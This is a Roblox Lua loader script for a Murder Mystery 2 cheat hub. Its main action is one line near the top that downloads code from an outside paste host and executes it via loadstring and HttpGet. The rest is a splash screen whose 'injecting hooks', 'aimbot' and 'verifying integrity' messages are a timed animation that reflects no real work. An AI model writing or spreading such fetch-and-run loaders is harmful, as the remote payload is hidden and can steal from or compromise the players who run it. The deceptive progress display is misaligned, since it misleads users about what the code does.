local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")

local Theme = {
    Primary    = Color3.fromRGB(255, 115, 0),
    Background = Color3.fromRGB(8, 6, 4),
    Gradient   = Color3.fromRGB(38, 16, 4),
    Text       = Color3.fromRGB(255, 210, 160),
    Muted      = Color3.fromRGB(180, 95, 35),
}

local Messages = {
    "Summoning scripts...",
    "Initializing core modules...",
    "Loading player data...",
    "Fetching remote configs...",
    "Injecting hooks...",
    "Patching game functions...",
    "Syncing with server...",
    "Verifying integrity...",
    "Warming up aimbot...",
    "Compiling ESP renderer...",
    "Loading UI assets...",
    "Calibrating hitbox data...",
    "Finalizing modules...",
    "Almost ready...",
}

task.spawn(function()
     loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/TJq9zflPElZ4xHHx/raw"))()
end)

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "BestMM2Loader"
screenGui.ResetOnSpawn = false
screenGui.DisplayOrder = 999
screenGui.Parent = CoreGui

local container = Instance.new("Frame")
container.AnchorPoint = Vector2.new(0.5, 0.5)
container.Position = UDim2.new(0.5, 0, 0.5, 0)
container.Size = UDim2.new(0, 0, 0, 0)
container.BackgroundColor3 = Theme.Background
container.BorderSizePixel = 0
container.Parent = screenGui
Instance.new("UICorner", container).CornerRadius = UDim.new(0, 18)

local grad = Instance.new("UIGradient", container)
grad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Theme.Background),
    ColorSequenceKeypoint.new(1, Theme.Gradient),
})
grad.Rotation = 100

local stroke = Instance.new("UIStroke", container)
stroke.Color = Theme.Primary
stroke.Thickness = 2
stroke.Transparency = 0.3

local glow = Instance.new("UIStroke", container)
glow.Color = Theme.Primary
glow.Thickness = 6
glow.Transparency = 1
glow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

local logo = Instance.new("Frame", container)
logo.AnchorPoint = Vector2.new(0.5, 0)
logo.Position = UDim2.new(0.5, 0, 0, 28)
logo.Size = UDim2.new(0, 64, 0, 64)
logo.BackgroundColor3 = Theme.Primary
logo.BorderSizePixel = 0
Instance.new("UICorner", logo).CornerRadius = UDim.new(0, 16)

local logoText = Instance.new("TextLabel", logo)
logoText.Size = UDim2.new(1, 0, 1, 0)
logoText.BackgroundTransparency = 1
logoText.Text = "🎃"
logoText.TextColor3 = Color3.fromRGB(255, 255, 255)
logoText.TextSize = 32
logoText.Font = Enum.Font.GothamBold

local title = Instance.new("TextLabel", container)
title.Size = UDim2.new(1, -40, 0, 32)
title.Position = UDim2.new(0, 20, 0, 100)
title.BackgroundTransparency = 1
title.Text = "Best Script Hub"
title.TextColor3 = Theme.Text
title.TextSize = 22
title.Font = Enum.Font.GothamBold

local subtitle = Instance.new("TextLabel", container)
subtitle.Size = UDim2.new(1, -40, 0, 18)
subtitle.Position = UDim2.new(0, 20, 0, 132)
subtitle.BackgroundTransparency = 1
subtitle.Text = "Murder Mystery 2"
subtitle.TextColor3 = Theme.Muted
subtitle.TextSize = 13
subtitle.Font = Enum.Font.Gotham

local barBg = Instance.new("Frame", container)
barBg.Size = UDim2.new(1, -60, 0, 6)
barBg.Position = UDim2.new(0, 30, 0, 168)
barBg.BackgroundColor3 = Theme.Gradient
barBg.BorderSizePixel = 0
barBg.ClipsDescendants = true
Instance.new("UICorner", barBg).CornerRadius = UDim.new(1, 0)

local barFill = Instance.new("Frame", barBg)
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Theme.Primary
barFill.BorderSizePixel = 0
Instance.new("UICorner", barFill).CornerRadius = UDim.new(1, 0)

local barGrad = Instance.new("UIGradient", barFill)
barGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(200, 70, 0)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 160, 30)),
})

local shine = Instance.new("Frame", barFill)
shine.Size = UDim2.new(0.3, 0, 1, 0)
shine.Position = UDim2.new(-0.3, 0, 0, 0)
shine.BackgroundColor3 = Color3.fromRGB(255, 200, 100)
shine.BackgroundTransparency = 0.5
shine.BorderSizePixel = 0

local statusText = Instance.new("TextLabel", container)
statusText.Size = UDim2.new(1, -40, 0, 18)
statusText.Position = UDim2.new(0, 20, 0, 190)
statusText.BackgroundTransparency = 1
statusText.Text = Messages[1]
statusText.TextColor3 = Theme.Muted
statusText.TextSize = 12
statusText.Font = Enum.Font.Code

local percentText = Instance.new("TextLabel", container)
percentText.Size = UDim2.new(1, -40, 0, 18)
percentText.Position = UDim2.new(0, 20, 0, 210)
percentText.BackgroundTransparency = 1
percentText.Text = "0%"
percentText.TextColor3 = Theme.Primary
percentText.TextSize = 14
percentText.Font = Enum.Font.GothamBold
percentText.TextTransparency = 1

for _, c in ipairs(container:GetDescendants()) do
    if c:IsA("TextLabel") and c ~= percentText then c.TextTransparency = 1
    elseif c:IsA("Frame") and c ~= barFill and c ~= shine then c.BackgroundTransparency = 1
    elseif c:IsA("UIStroke") then c.Transparency = 1 end
end

local shineRunning = true
task.spawn(function()
    while shineRunning do
        shine.Position = UDim2.new(-0.3, 0, 0, 0)
        TweenService:Create(shine, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { Position = UDim2.new(1.3, 0, 0, 0) }):Play()
        task.wait(1.2)
    end
end)

local intro = TweenService:Create(container, TweenInfo.new(0.6, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), { Size = UDim2.new(0, 380, 0, 250) })
intro:Play()
intro.Completed:Wait()

for _, c in ipairs(container:GetDescendants()) do
    if c:IsA("TextLabel") then
        TweenService:Create(c, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), { TextTransparency = 0 }):Play()
    elseif c:IsA("Frame") and c ~= shine then
        TweenService:Create(c, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), { BackgroundTransparency = 0 }):Play()
    elseif c:IsA("UIStroke") and c ~= glow then
        TweenService:Create(c, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), { Transparency = 0.3 }):Play()
    end
    task.wait(0.015)
end

TweenService:Create(shine, TweenInfo.new(0.5), { BackgroundTransparency = 0.5 }):Play()

local currentProgress = 0
for i, msg in ipairs(Messages) do
    local textOut = TweenService:Create(statusText, TweenInfo.new(0.15), { TextTransparency = 1 })
    textOut:Play()
    textOut.Completed:Wait()
    statusText.Text = msg
    TweenService:Create(statusText, TweenInfo.new(0.2), { TextTransparency = 0 }):Play()
    local targetProgress = i / #Messages
    local duration = 4
    local startProgress = currentProgress
    local stepAmount = targetProgress - startProgress
    for t = 0, 1, 0.02 do
        local eased = t * t * (3 - 2 * t)
        local progress = startProgress + (stepAmount * eased)
        barFill.Size = UDim2.new(progress, 0, 1, 0)
        percentText.Text = string.format("%.0f%%", progress * 100)
        task.wait(duration / 50)
    end
    currentProgress = targetProgress
    task.wait(0.15)
end

barFill.Size = UDim2.new(1, 0, 1, 0)
percentText.Text = "100%"
statusText.Text = "Let the chaos begin..."
TweenService:Create(glow, TweenInfo.new(0.25, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), { Transparency = 0.5 }):Play()
task.wait(0.35)
shineRunning = false

local outro = TweenService:Create(container, TweenInfo.new(0.45, Enum.EasingStyle.Back, Enum.EasingDirection.In), { Size = UDim2.new(0, 0, 0, 0) })
for _, c in ipairs(container:GetDescendants()) do
    if c:IsA("TextLabel") then TweenService:Create(c, TweenInfo.new(0.3), { TextTransparency = 1 }):Play()
    elseif c:IsA("Frame") then TweenService:Create(c, TweenInfo.new(0.3), { BackgroundTransparency = 1 }):Play()
    elseif c:IsA("UIStroke") then TweenService:Create(c, TweenInfo.new(0.3), { Transparency = 1 }):Play() end
end
outro:Play()
outro.Completed:Wait()
screenGui:Destroy()
